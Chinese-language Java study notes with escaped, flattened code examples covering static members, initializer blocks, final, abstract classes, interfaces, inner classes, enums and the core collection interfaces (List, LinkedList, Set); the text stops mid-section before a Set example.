public class New &#123;    public static void main(String[] args) &#123;//创建 2 个学生对象，交学费        Stu tom = new Stu(&quot;tom&quot;);//tom.payFee(100);        Stu.payFee(100);//对不对?对        Stu mary = new Stu(&quot;mary&quot;);//mary.payFee(200);        Stu.payFee(200);//对//输出当前收到的总学费        Stu.showFee();//300//如果我们希望不创建实例，也可以调用某个方法(即当做工具来使用)//这时，把方法做成静态方法时非常合适        System.out.println(&quot;9 开平方的结果是=&quot; + Math.sqrt(9));        System.out.println(MyTools.calSum(10, 30));    &#125;&#125;//开发自己的工具类时，可以将方法做成静态的，方便调用class MyTools &#123;    //求出两个数的和    public static double calSum(double n1, double n2) &#123;        return n1 + n2;    &#125;&#125;    //可以写出很多这样的工具方法... &#125;    class Stu &#123;        private String name;//普通成员        //定义一个静态变量，来累积学生的学费        private static double fee = 0;        public Stu(String name) &#123;            this.name = name;        &#125;        //说明//1. 当方法使用了 static 修饰后，该方法就是静态方法//2. 静态方法就可以访问静态属性/变量        public static void payFee(double fee) &#123;            Stu.fee += fee;//累积到        &#125;        public static void showFee() &#123;            System.out.println(&quot;总学费有:&quot; + Stu.fee);        &#125;    &#125;

注意：静态方法只能访问静态成员，非静态的方法可以访问静态成员和非静态成员
代码块代码化块又称为初始化块，属于类中的成员，类似于方法，但和方法不一样的是它没有方法名，没有返回，没有参数，只有方法体，而且不用通过对象或类显式调用，而是加载类时，或创建对象时隐式调用
语法：[修饰符]&#123;代码&#125;;，要注意修饰符可选，要写的话也只能写static
代码块相当于另一种形式的构造器，可以进行初始化操作，如果说多个构造器中都有重复语句时，可以抽取到代码块中，提高代码重用性
举个例子如下：
class Movie &#123;private String name;private double price;private String director;//3 个构造器-》重载//(1) 下面的三个构造器都有相同的语句//(2) 这样代码看起来比较冗余//(3) 这时我们可以把相同的语句，放入到一个代码块中，即可//(4) 这样当我们不管调用哪个构造器，创建对象，都会先调用代码块的内容//(5) 代码块调用的顺序优先于构造器System.out.println(&quot;电影屏幕打开...&quot;);System.out.println(&quot;广告开始...&quot;);System.out.println(&quot;电影正是开始...&quot;);&#125;;public Movie(String name) &#123;System.out.println(&quot;Movie(String name) 被调用...&quot;);this.name = name;&#125;public Movie(String name, double price) &#123;this.name = name;this.price = price;&#125;public Movie(String name, double price, String director) &#123;System.out.println(&quot;Movie(String name, double price, String director) 被调用...&quot;);this.name = name;this.price = price;this.director = director;&#125;&#125;

static代码块也叫做静态代码块，作用是对类进行初始化，随类的加载而执行，并且只会执行一次，而普通的代码块没创建一个对象就执行
那么类什么时候会被加载呢
创建类的实例时：

当你使用 new 关键字创建一个类的对象时，JVM 会先检查该类是否已加载。如果没有加载，则会触发类的加载。

示例：
MyClass obj = new MyClass(); // 创建对象，加载 MyClass 类

访问类的静态成员（静态变量或静态方法）时：

当你访问一个类的静态变量或调用静态方法时，如果类尚未加载，JVM 会加载该类。

示例：
System.out.println(MyClass.staticVariable); // 访问静态变量，加载 MyClass 类MyClass.staticMethod(); // 调用静态方法，加载 MyClass 类

类的初始化（静态代码块）：

类在加载时，静态代码块会被执行。这通常发生在静态成员被访问或类被实例化之前。

示例：
class MyClass &#123;    static &#123;        System.out.println(&quot;MyClass loaded&quot;);    &#125;&#125;// 任何访问 MyClass 的操作都会触发静态代码块的执行

子类初始化时：

当一个子类被初始化时，如果其父类尚未被加载，那么父类会先被加载。

示例：
class Parent &#123;    static &#123;        System.out.println(&quot;Parent loaded&quot;);    &#125;&#125;class Child extends Parent &#123;    static &#123;        System.out.println(&quot;Child loaded&quot;);    &#125;&#125;public class Main &#123;    public static void main(String[] args) &#123;        new Child(); // 加载顺序：先加载 Parent 类，再加载 Child 类    &#125;&#125;

final关键字final 关键字的用法
用于类（final class）：

含义：如果一个类被声明为 final，则不能被继承。这意味着没有其他类可以扩展这个类。

用途：使用 final 类通常是为了确保该类的实现不会被更改或扩展。例如，java.lang.String 类就是一个 final 类，它不能被继承。

示例
public final class Constants &#123;    // 该类不能被继承&#125;


用于方法（final method）：

含义：如果一个方法被声明为 final，则子类不能重写这个方法。

用途：使用 final 方法通常是为了防止子类更改方法的核心行为，确保方法的功能保持不变。

示例
class Parent &#123;    public final void display() &#123;        System.out.println(&quot;This is a final method.&quot;);    &#125;&#125;class Child extends Parent &#123;    // 下面的代码会导致编译错误，因为 final 方法不能被重写    // public void display() &#123;    //     System.out.println(&quot;Attempt to override.&quot;);    // &#125;&#125;


用于变量（final variable）：

含义：如果一个变量被声明为 final，则它的值一旦被初始化，就不能再更改。

用途

对于 基本数据类型（如 int、char 等），final 变量的值在初始化后不可变。
对于 引用数据类型（如对象、数组），final 变量的引用在初始化后不可更改（即不能指向另一个对象），但对象的内容可以改变。


示例
final int MAX_VALUE = 100; // 基本数据类型，值不能更改final Person person = new Person(&quot;John&quot;);// person = new Person(&quot;Doe&quot;); // 错误：不能改变引用person.setName(&quot;Doe&quot;); // 合法：对象内容可以改变



特别说明
final 和类加载的优化：

JVM 和编译器可以利用 final 关键字进行优化。例如，一个 final 变量的值是已知的，可以在编译时内联（inlining），从而提高性能。


final 和不可变对象：

使用 final 关键字是创建不可变对象的重要步骤之一。不可变对象的所有字段都应该是 final，以确保其状态在构造后不会改变。


final 参数：

方法的参数也可以用 final 声明，这意味着在方法中你不能更改参数的引用。

示例：
public void display(final String message) &#123;    // message = &quot;New Message&quot;; // 错误：不能更改 `final` 参数    System.out.println(message);&#125;


final 和多线程安全性：

在多线程环境中，final 变量可以确保变量在对象构造完成后被安全地发布给其他线程，因为 final 字段在对象构造完成后是可见的。



总结
final 类不能被继承。
final 方法不能被重写。
final 变量的值在初始化后不能被更改。
final 是创建不可变类和提供线程安全的一种常见技术。

抽象类
当父类的某些方法需要声明但又不确定如何实现时，可以先将其声明为抽象方法，那么这个类就是抽象类，用abstract关键字来声明

语法：访问修饰符 abstract 类名&#123;&#125;

用abstract关键字来修饰一个方法的时候，该方法就是抽象方法

语法：访问修饰符 abstract 返回类型 方法名(参数列表);//没有方法体
有以下几点需要注意：

抽象类不能够被实例化
抽象类可以没有abstract方法
一旦类被声明为abstract方法，则这个类必须声明为abstract
abstract只能够修饰类和方法，不能修饰属性和其他的
一个类继承了抽象类，则它必须实现抽象类中的所有抽象方法，除非它自己也声明为abstract类
抽象方法不能够用private,final和static来修饰，这些关键字都是和重写相违背的

接口基础接口就是给出一些没有实现的方法，封装到一起，在根据具体情况把这些方法写出来
语法如下：
interface 接口名&#123;	//属性	//抽象方法&#125;class 类名 implements 接口&#123;	自己属性;	自己方法;	必须实现的接口的抽象方法&#125;

那么什么时候使用接口呢，下面举个例子：现在要制造战斗机，武装直升机，专家只需要将飞机所需的功能&#x2F;规格定下来即可，剩下的交给别人实现就可以了、
下面来个简单的代码例子：DBInterface.java
package show;public interface DBInterface &#123; //项目经理    public void connect();//连接方法    public void close();//关闭连接&#125;

MysqlDB.java
package show;public class MysqlDB implements DBInterface&#123;    @Override    public void connect() &#123;        System.out.println(&quot;Connecting to MysqlDB&quot;);    &#125;    @Override    public void close()&#123;        System.out.println(&quot;Closing MysqlDB&quot;);    &#125;&#125;

New.java
import show.MysqlDB;public class New &#123;    public static void main(String[] args) &#123;        MysqlDB mysqlDB = new MysqlDB();        mysqlDB.connect();        mysqlDB.close();    &#125;&#125;

有以下几点需要注意的



接口的多态特性
多态参数：接口的多态参数指的是在方法定义中，使用接口类型作为参数。由于Java中接口可以被多个类实现，因此在方法中可以传入任何实现了该接口的类的对象，从而实现了多态性

在Java中，父类（或接口）类型的引用可以指向任何子类（或实现类）的对象，并且调用方法时，会根据对象的实际类型执行对应的方法
// 定义一个接口interface Animal &#123;    void sound();&#125;// 实现接口的第一个类class Dog implements Animal &#123;    @Override    public void sound() &#123;        System.out.println(&quot;Dog barks&quot;);    &#125;&#125;// 实现接口的第二个类class Cat implements Animal &#123;    @Override    public void sound() &#123;        System.out.println(&quot;Cat meows&quot;);    &#125;&#125;// 一个使用接口作为参数的方法class Zoo &#123;    public void makeSound(Animal animal) &#123;        animal.sound();// 动态绑定到具体对象的实现    &#125;&#125;public class Main &#123;    public static void main(String[] args) &#123;        Zoo zoo = new Zoo();                Dog dog = new Dog();        Cat cat = new Cat();                zoo.makeSound(dog); // 输出 &quot;Dog barks&quot;        zoo.makeSound(cat); // 输出 &quot;Cat meows&quot;    &#125;&#125;


多态数组
接口存在多态传递现象

public class InterfacePolyPass &#123;    public static void main(String[] args) &#123;//接口类型的变量可以指向实现了该接口的类的对象实例        IG ig = new Teacher();//如果 IG 继承了 IH 接口，而 Teacher 类实现了 IG 接口//那么，实际上就相当于 Teacher 类也实现了 IH 接口. //这就是所谓的 接口多态传递现象. IH ih = new Teacher();    &#125;&#125;interface IH &#123;    void hi();&#125;interface IG extends IH&#123; &#125;class Teacher implements IG &#123;    @Override    public void hi() &#123;    &#125;&#125;

内部类基础一个类内部完整地嵌套另一个类，被嵌套的类称为内部类，嵌套其他类的类称为外部类
内部类的最大特点就是可以直接访问私有属性
class Outer&#123;//外部类	class Inner&#123;	&#125;//内部类&#125;clas Other&#123;&#125;//外部其他类

举个例子，如下
class Outer &#123; //外部类	private int n1 = 100;//属性	public Outer(int n1) &#123;//构造器		this.n1 = n1;	&#125;	public void m1() &#123;//方法		System.out.println(&quot;m1()&quot;);	&#125;	&#123;//代码块		System.out.println(&quot;代码块...&quot;);	&#125;	class Inner &#123; //内部类, 在 Outer 类的内部	&#125;&#125;

内部类的分类定义在外部类局部位置上（比如方法内）局部内部类

定义在外部类的局部位置，比如方法中，并且有类名
可以直接访问所有成员，包括私有成员
不能添加访问修饰符，因为它其实就是一个局部变量，但可以使用final来修饰
仅仅作用于定义它的方法或代码块中
外部类访问内部类的成员的话要创建对象来访问
外部其他类不能访问局部内部类
如果外部类和局部内部类的成员重名时，遵守就近原则，如果想访问外部类的成员的话，可以用外部类名.this.成员来访问

public class LocalInnerClass &#123;//	public static void main(String[] args) &#123;		Outer02 outer02 = new Outer02();		outer02.m1();		System.out.println(&quot;outer02 的 hashcode=&quot; + outer02);	&#125;&#125;class Outer02 &#123;//外部类	private int n1 = 100;	private void m2() &#123;		System.out.println(&quot;Outer02 m2()&quot;);	&#125;//私有方法	public void m1() &#123;//方法	//1.局部内部类是定义在外部类的局部位置,通常在方法	//3.不能添加访问修饰符,但是可以使用 final 修饰	//4.作用域 : 仅仅在定义它的方法或代码块中		final class Inner02 &#123;//局部内部类(本质仍然是一个类)		//2.可以直接访问外部类的所有成员，包含私有的			private int n1 = 800;			public void f1() &#123;		//5. 局部内部类可以直接访问外部类的成员，比如下面 外部类 n1 和 m2()		//7. 如果外部类和局部内部类的成员重名时，默认遵循就近原则，如果想访问外部类的成员，		// 使用 外部类名.this.成员）去访问		// Outer02.this 本质就是外部类的对象, 即哪个对象调用了 m1, Outer02.this 就是哪个对象			System.out.println(&quot;n1=&quot; + n1 + &quot; 外部类的 n1=&quot; + Outer02.this.n1);			System.out.println(&quot;Outer02.this hashcode=&quot; + Outer02.this);			m2();			&#125;		&#125;		//6. 外部类在方法中，可以创建 Inner02 对象，然后调用方法即可		Inner02 inner02 = new Inner02();		inner02.f1();	&#125;&#125;

匿名内部类的使用（重要）
定义在外部类的局部位置，比如方法中，并且没有类名
new 类或接口(参数列表)&#123;	类体&#125;;

匿名内部类的特点：

没有名字：匿名内部类没有名字，不能在其他地方引用它，只能在声明时使用。
通常用于简化代码：特别是当你只需要一个类的一个实例，并且该类不需要被重复使用时，可以用匿名内部类。它通常用来实现接口或者继承类，以提供特定的实现。
只能创建一次实例：匿名内部类的创建与实例化是在同一个地方完成的，因此不能在多个地方重复使用该类。
语法简洁：匿名内部类允许在代码中定义一个类的同时创建一个该类的实例，省去了为类单独命名和定义的麻烦

例子如下：
public class Main &#123;    public static void main(String[] args) &#123;        // 创建一个线程，使用匿名内部类来实现Runnable接口        Runnable runnable = new Runnable() &#123;            @Override            public void run() &#123;                System.out.println(&quot;线程正在运行...&quot;);            &#125;        &#125;;                Thread thread = new Thread(runnable);//创建一个新的线程对象        thread.start();    &#125;&#125;

再举一个例子如下：
public class New &#123;    public static void main(String[] args) &#123;//当做实参直接传递，简洁高效        f1(new IL() &#123;            @Override            public void show() &#123;                System.out.println(&quot;这是一副名画~~...&quot;);            &#125;        &#125;);//传统方法        f1(new Picture());    &#125;    //静态方法,形参是接口类型    public static void f1(IL il) &#123;        il.show();    &#125;&#125;//接口interface IL &#123;    void show();&#125;//类-&gt;实现 IL =&gt; 编程领域 (硬编码)class Picture implements IL &#123;    @Override    public void show() &#123;        System.out.println(&quot;这是一副名画 XX...&quot;);    &#125;&#125;

成员内部类
定义在外部类的成员位置上，并且没有static修饰
可以直接访问外部类的所有成员，包括私有的
可以添加任意访问修饰符，因为它的地位就是一个成员
作用域和外部类的其他成员一样，都为整个类体
当外部类和内部类重名的时候，内部类访问时遵守就近原则，想访问外部类成员，可以使用外部类名.this.成员来访问

public class New &#123;    public static void main(String[] args) &#123;        Outer08 outer08 = new Outer08();        outer08.t1();//外部其他类，使用成员内部类的三种方式// 第一种方式// outer08.new Inner08(); 相当于把 new Inner08()当做是 outer08 成员// 这就是一个语法，不要特别的纠结.        Outer08.Inner08 inner08 = outer08.new Inner08();        inner08.say();// 第二方式 在外部类中，编写一个方法，可以返回 Inner08 对象        Outer08.Inner08 inner08Instance = outer08.getInner08Instance();        inner08Instance.say();    &#125;&#125;class Outer08 &#123; //外部类    private int n1 = 10;    public String name = &quot;张三&quot;;    private void hi() &#123;        System.out.println(&quot;hi()方法...&quot;);    &#125;    //1.注意: 成员内部类，是定义在外部内的成员位置上//2.可以添加任意访问修饰符(public、protected 、默认、private),因为它的地位就是一个成员    public class Inner08 &#123;//成员内部类        private double sal = 99.8;        private int n1 = 66;        public void say() &#123;//可以直接访问外部类的所有成员，包含私有的//如果成员内部类的成员和外部类的成员重名，会遵守就近原则. //，可以通过 外部类名.this.属性 来访问外部类的成员            System.out.println(&quot;n1 = &quot; + n1 + &quot; name = &quot; + name + &quot; 外部类的 n1=&quot; + Outer08.this.n1);            hi();        &#125;    &#125;    //方法，返回一个 Inner08 实例    public Inner08 getInner08Instance()&#123;        return new Inner08();    &#125;    //写方法    public void t1() &#123;//使用成员内部类//创建成员内部类的对象，然后使用相关的方法        Inner08 inner08 = new Inner08();        inner08.say();        System.out.println(inner08.sal);    &#125;&#125;

静态内部类
定义在外部类成员位置，并有static修饰
可以直接访问外部类所有的静态成员，包含私有的，但不能直接访问非静态成员
当外部类和静态内部类重名时，静态内部类访问时，遵循就近原则，如果想访问外部类的成员，则可以使用外部类名.成员来访问

枚举基础Java 枚举类使用 enum 关键字来定义，各个常量使用逗号 , 来分割。
例如定义一个颜色的枚举类。
enum Color &#123;     RED, GREEN, BLUE; &#125; 

以上枚举类 Color 颜色常量有 RED, GREEN, BLUE，分别表示红色，绿色，蓝色
enum Color &#123;     RED, GREEN, BLUE; &#125;   public class Test &#123;     // 执行输出结果    public static void main(String[] args)     &#123;         Color c1 = Color.RED;         System.out.println(c1);     &#125; &#125;

内部类中使用枚举枚举类也可以声明在内部类中：
public class Test &#123;     enum Color     &#123;         RED, GREEN, BLUE;     &#125;    // 执行输出结果    public static void main(String[] args)     &#123;         Color c1 = Color.RED;         System.out.println(c1);     &#125;&#125;

每个枚举都是通过 Class 在内部实现的，且所有的枚举值都是 public static final 的。
以上的枚举类 Color 转化在内部类实现：
class Color&#123;     public static final Color RED = new Color();     public static final Color BLUE = new Color();     public static final Color GREEN = new Color();&#125;

迭代枚举元素可以使用 for 语句来迭代枚举元素：
enum Color &#123;     RED, GREEN, BLUE; &#125; public class MyClass &#123;   public static void main(String[] args) &#123;     for (Color myVar : Color.values()) &#123;      System.out.println(myVar);    &#125;//Color.values() 是一个静态方法，返回枚举类型中所有定义的常量值（即 RED、GREEN 和 BLUE）作为一个数组  &#125; &#125;

在 switch 中使用枚举类枚举类常应用于 switch 语句中：
enum Color &#123;     RED, GREEN, BLUE; &#125; public class MyClass &#123;  public static void main(String[] args) &#123;    Color myVar = Color.BLUE;    switch(myVar) &#123;      case RED:        System.out.println(&quot;红色&quot;);        break;      case GREEN:         System.out.println(&quot;绿色&quot;);        break;      case BLUE:        System.out.println(&quot;蓝色&quot;);        break;    &#125;  &#125;&#125;

values(), ordinal() 和 valueOf() 方法enum 定义的枚举类默认继承了 java.lang.Enum 类，并实现了 java.lang.Serializable 和 java.lang.Comparable 两个接口。
values(), ordinal() 和 valueOf() 方法位于 java.lang.Enum 类中：

values() 返回枚举类中所有的值。
ordinal()方法可以找到每个枚举常量的索引，就像数组索引一样。
valueOf()方法返回指定字符串值的枚举常量。

enum Color &#123;     RED, GREEN, BLUE; &#125;   public class Test &#123;     public static void main(String[] args)     &#123;         // 调用 values()         Color[] arr = Color.values();           // 迭代枚举        for (Color col : arr)         &#123;             // 查看索引            System.out.println(col + &quot; at index &quot; + col.ordinal());         &#125;           // 使用 valueOf() 返回枚举常量，不存在的会报错 IllegalArgumentException         System.out.println(Color.valueOf(&quot;RED&quot;));         // System.out.println(Color.valueOf(&quot;WHITE&quot;));     &#125; &#125;

枚举类成员枚举跟普通类一样可以用自己的变量、方法和构造函数，构造函数只能使用 private 访问修饰符，所以外部无法调用
枚举既可以包含具体方法，也可以包含抽象方法。 如果枚举类具有抽象方法，则枚举类的每个实例都必须实现它
enum Color &#123;     RED, GREEN, BLUE;       // 构造函数    private Color()     &#123;         System.out.println(&quot;Constructor called for : &quot; + this.toString());     &#125;       public void colorInfo()     &#123;         System.out.println(&quot;Universal Color&quot;);     &#125; &#125;   public class Test &#123;         // 输出    public static void main(String[] args)     &#123;         Color c1 = Color.RED;         System.out.println(c1);         c1.colorInfo();     &#125; &#125;

集合Java 的集合类主要分为两大类：
1.Collection 接口的子类（单列集合）：是 Java 集合框架中的根接口，主要用于存储一组元素
常见子接口包括：
List（列表）：有序且允许重复的集合，常用实现类包括：

ArrayList
LinkedList
Vector

Set（集合）：无序且不允许重复的集合，常用实现类包括：

HashSet
LinkedHashSet
TreeSet

Queue（队列）：用于按顺序处理元素，常用实现类包括：

LinkedList
PriorityQueue

2.Map 接口的子类（双列集合）：主要用于存储键值对
Collection接口和常用方法基本操作Collection 定义了集合对象的基本操作，例如添加、删除、遍历、清空等。这些方法被子类（如 List、Set 等）继承并具体实现。主要方法包括：

add(E e)：向集合中添加元素。
remove(Object o)：从集合中移除指定元素。
contains(Object o)：判断集合中是否包含指定元素。
size()：返回集合中元素的个数。
isEmpty()：判断集合是否为空。
clear()：清空集合中的所有元素。

import java.util.ArrayList;import java.util.List;public class New &#123;    //忽略所有类型的警告    @SuppressWarnings(&#123;&quot;all&quot;&#125;)    public static void main (String []args)    &#123;        List list = new ArrayList();// add:添加单个元素        list.add(&quot;jack&quot;);        list.add(10);//list.add(new Integer(10))        list.add(true);        System.out.println(&quot;list=&quot; + list);// remove:删除指定元素//list.remove(0);//删除第一个元素        list.remove(true);//指定删除某个元素        System.out.println(&quot;list=&quot; + list);// contains:查找元素是否存在        System.out.println(list.contains(&quot;jack&quot;));//T// size:获取元素个数        System.out.println(list.size());//2        // isEmpty:判断是否为空        System.out.println(list.isEmpty());//F// clear:清空        list.clear();        System.out.println(&quot;list=&quot; + list);// addAll:添加多个元素        ArrayList list2 = new ArrayList();        list2.add(&quot;红楼梦&quot;);        list2.add(&quot;三国演义&quot;);        list.addAll(list2);        System.out.println(&quot;list=&quot; + list);// containsAll:查找多个元素是否都存在        System.out.println(list.containsAll(list2));//T// removeAll：删除多个元素        list.add(&quot;聊斋&quot;);        list.removeAll(list2);        System.out.println(&quot;list=&quot; + list);//[聊斋]// 说明：以 ArrayList 实现类来演示.    &#125;&#125;

用 Iterator(迭代器)遍历接口元素
主要用于遍历Collection集合中的元素
所有实现Collection接口的集合类都有一个Iterator()方法，用以返回一个实现了Iterator接口的对象，即可以返回一个迭代器
Iterator仅用于遍历集合，其本身并不存放对象

通常，Iterator 与 while 循环一起使用，通过其方法来进行遍历。
迭代器的工作原理

创建迭代器：调用集合对象的 iterator() 方法来创建一个 Iterator 实例。这个迭代器指向集合的第一个元素之前的位置。
遍历元素：通过 hasNext() 来检查是否有下一个元素，通过 next() 来获取下一个元素的值。内部会记录当前位置，每调用一次 next()，迭代器会移动到下一个元素。
删除元素（可选）：如果需要，可以调用 remove() 方法来删除刚刚通过 next() 访问的元素

Iterator 接口包含以下三个核心方法：

boolean hasNext(): 检查集合中是否还有下一个元素。如果存在下一个元素，则返回 true，否则返回 false。
if (iterator.hasNext()) &#123;    // Do something&#125;

E next(): 返回集合中的下一个元素。如果调用时没有元素，通常会抛出 NoSuchElementException。
E element = iterator.next();

void remove(): 从底层集合中移除 next() 方法返回的上一个元素。这个方法是可选的，如果集合不支持元素的删除操作，可能会抛出 UnsupportedOperationException。


来个简单的例子
import java.util.ArrayList;import java.util.Iterator;import java.util.List;public class IteratorExample &#123;    public static void main(String[] args) &#123;        List&lt;String&gt; list = new ArrayList&lt;&gt;();        list.add(&quot;apple&quot;);        list.add(&quot;banana&quot;);        list.add(&quot;cherry&quot;);        Iterator&lt;String&gt; iterator = list.iterator();        while (iterator.hasNext()) &#123;            String element = iterator.next();            System.out.println(element);        &#125;    &#125;&#125;

特点

Iterator 提供了一种统一的方式来遍历不同类型的集合。
它只支持单向遍历，不允许回退。（想再次遍历需要重置迭代器，即iterator = col.iterator();）
与增强的 for 循环相比，Iterator 提供了更细粒度的控制（如删除操作）

增强for循环增强for循环，可以替代iterator迭代器
特点：其实就是简单版的iterator，本质一样，只能用于遍历集合或者数组
基本语法：
for(元素类型 元素名:集合名或数组名)&#123;	访问元素&#125;

例子如下：
import java.util.ArrayList;import java.util.Iterator;import java.util.List;public class New &#123;    @SuppressWarnings(&#123;&quot;all&quot;&#125;)    public static void main(String[] args) &#123;        List list = new ArrayList();        list.add(new Dog(&quot;小黑&quot;, 3));        list.add(new Dog(&quot;大黄&quot;, 100));        list.add(new Dog(&quot;大壮&quot;, 8));//先使用 for 增强        for (Object dog : list) &#123;            System.out.println(&quot;dog=&quot; + dog);        &#125;//使用迭代器        System.out.println(&quot;===使用迭代器来遍历===&quot;);        Iterator iterator = list.iterator();        while (iterator.hasNext()) &#123;            Object dog = iterator.next();            System.out.println(&quot;dog=&quot; + dog);        &#125;    &#125;&#125;/** * 创建 3 个 Dog &#123;name, age&#125; 对象，放入到 ArrayList 中，赋给 List 引用 * 用迭代器和增强 for 循环两种方式来遍历 * 重写 Dog 的 toString 方法， 输出 name 和 age */class Dog &#123;    private String name;    private int age;    public Dog(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public int getAge() &#123;        return age;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;    @Override    public String toString() &#123;        return &quot;Dog&#123;&quot; +                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +                &quot;, age=&quot; + age +                &#x27;&#125;&#x27;;    &#125;&#125;

List接口和常用方法基本
List接口是Collection接口的子接口
List集合类中元素有序（即添加顺序和取出顺序一致）、且可重复
List集合中的每个元素都有其对应的顺序索引
List容器中的元素都对应一个整数型的序号记载其在容器中的位置，可以根据序号存取容器中的元素

常用方法以下是 List 接口中的一些常用方法：

void add(E element)


功能: 将指定的元素添加到列表的末尾。

示例
List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(&quot;Apple&quot;);


void add(int index, E element)


功能: 在指定位置插入元素。其后的元素将向右移动。

示例
List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(&quot;Apple&quot;);list.add(0, &quot;Banana&quot;);  // 在索引 0 位置插入元素


E get(int index)


功能: 返回列表中指定索引处的元素。

示例
List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(&quot;Apple&quot;);String fruit = list.get(0);  // 获取索引 0 处的元素


E set(int index, E element)


功能: 用指定的元素替换列表中指定索引位置的元素，并返回被替换的元素。

示例
List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(&quot;Apple&quot;);list.set(0, &quot;Banana&quot;);  // 将索引 0 处的元素替换为 Banana


E remove(int index)


功能: 移除指定索引位置的元素，并返回被移除的元素。

示例
List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(&quot;Apple&quot;);list.remove(0);  // 移除索引 0 处的元素


boolean remove(Object o)


功能: 从列表中移除首次出现的指定元素。如果列表中包含该元素，返回 true；否则，返回 false。

示例
List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(&quot;Apple&quot;);list.remove(&quot;Apple&quot;);  // 移除元素 &quot;Apple&quot;


int size()


功能: 返回列表中的元素个数。

示例
List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(&quot;Apple&quot;);int size = list.size();  // 返回列表的大小


boolean isEmpty()


功能: 如果列表不包含元素，则返回 true；否则，返回 false。

示例
List&lt;String&gt; list = new ArrayList&lt;&gt;();boolean isEmpty = list.isEmpty();  // 检查列表是否为空


boolean contains(Object o)


功能: 如果列表中包含指定的元素，则返回 true。

示例
List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(&quot;Apple&quot;);boolean contains = list.contains(&quot;Apple&quot;);  // 检查是否包含 &quot;Apple&quot;


int indexOf(Object o)


功能: 返回列表中第一次出现的指定元素的索引，如果列表中不包含该元素，则返回 -1。

示例
List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(&quot;Apple&quot;);int index = list.indexOf(&quot;Apple&quot;);  // 返回元素 &quot;Apple&quot; 的索引


int lastIndexOf(Object o)


功能: 返回列表中最后一次出现的指定元素的索引，如果列表中不包含该元素，则返回 -1。

示例
List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(&quot;Apple&quot;);list.add(&quot;Banana&quot;);list.add(&quot;Apple&quot;);int lastIndex = list.lastIndexOf(&quot;Apple&quot;);  // 返回 &quot;Apple&quot; 最后出现的索引


void clear()


功能: 移除列表中的所有元素。

示例
List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(&quot;Apple&quot;);list.clear();  // 清空列表


List&lt;E&gt; subList(int fromIndex, int toIndex)


功能: 返回列表中指定范围内的元素的视图（包含 fromIndex，不包含 toIndex）。

示例
List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(&quot;Apple&quot;);list.add(&quot;Banana&quot;);list.add(&quot;Cherry&quot;);List&lt;String&gt; sublist = list.subList(0, 2);  // 返回子列表 [&quot;Apple&quot;, &quot;Banana&quot;]


Object[] toArray()


功能: 返回包含列表中所有元素的数组。

示例
List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(&quot;Apple&quot;);Object[] array = list.toArray();  // 转换为数组


boolean addAll(int index, Collection eles)


功能: 从 index 位置开始将 eles 中的所有元素添加进来

示例
List&lt;String&gt; list1 = new ArrayList&lt;&gt;();list1.add(&quot;Apple&quot;);list1.add(&quot;Banana&quot;);List&lt;String&gt; list2 = new ArrayList&lt;&gt;();list2.add(&quot;Cherry&quot;);list2.add(&quot;Date&quot;);list1.addAll(1, list2);  // 在索引 1 处插入 list2 的所有元素System.out.println(list1);

LinkedList 底层结构基本1.双向链表：LinkedList 由节点组成，每个节点包含三部分：一个元素值、指向前一个节点的引用（prev）、以及指向下一个节点的引用（next）。
2.动态扩展：与数组不同，LinkedList 不需要预先定义大小，它可以根据需要动态扩展，方便在中间进行元素插入和删除操作。
3.实现接口：

List 接口：LinkedList 可以当作一个列表来使用，支持按索引访问元素，提供列表的所有基本操作，比如增加、删除、获取元素等。
Deque 接口：LinkedList 可以当作双端队列使用，支持从两端插入和删除元素，这使得它非常适合用作队列（FIFO）或栈（LIFO）。

常用方法：
添加元素：
add(E element)：将元素添加到列表末尾。
addFirst(E element)：在链表开头添加元素。
addLast(E element)：在链表末尾添加元素（与 add() 相同）。


删除元素：
remove()：移除并返回链表的第一个元素。
removeFirst()：移除并返回链表的第一个元素（与 remove() 相同）。
removeLast()：移除并返回链表的最后一个元素。
remove(int index)：删除链表中指定索引位置的元素，并返回被删除的元素。
remove(Object o)：删除链表中首次出现的指定对象


访问元素：
get(int index)：获取指定位置的元素。
getFirst()：获取第一个元素。
getLast()：获取最后一个元素



举个简单的例子如下：
import java.util.LinkedList;public class Main &#123;    public static void main(String[] args) &#123;        LinkedList&lt;String&gt; list = new LinkedList&lt;&gt;();                // 添加元素        list.add(&quot;A&quot;);        list.add(&quot;B&quot;);        list.addFirst(&quot;Start&quot;);        list.addLast(&quot;End&quot;);                // 访问元素        System.out.println(&quot;First element: &quot; + list.getFirst());  // Start        System.out.println(&quot;Last element: &quot; + list.getLast());    // End                // 删除元素        list.removeFirst();  // 删除第一个元素        list.removeLast();   // 删除最后一个元素                System.out.println(&quot;List after removals: &quot; + list);    &#125;&#125;

LinkedList vs. ArrayList:
ArrayList 更适合随机访问元素，因为它是基于数组实现的，可以通过索引快速访问元素。
LinkedList 更适合频繁的插入和删除操作，因为它不需要移动大量数据

Set接口和常用方法基本无序，即添加和取出的顺序不一致，没有索引
不允许重复元素，所以最多包含一个null
常用方法Set接口为Collection接口的子接口，所以常用方法和Colletion接口一样
遍历方式
可以使用迭代器
增强for循环
不能使用索引的方式来获取

举个例子如下所示：
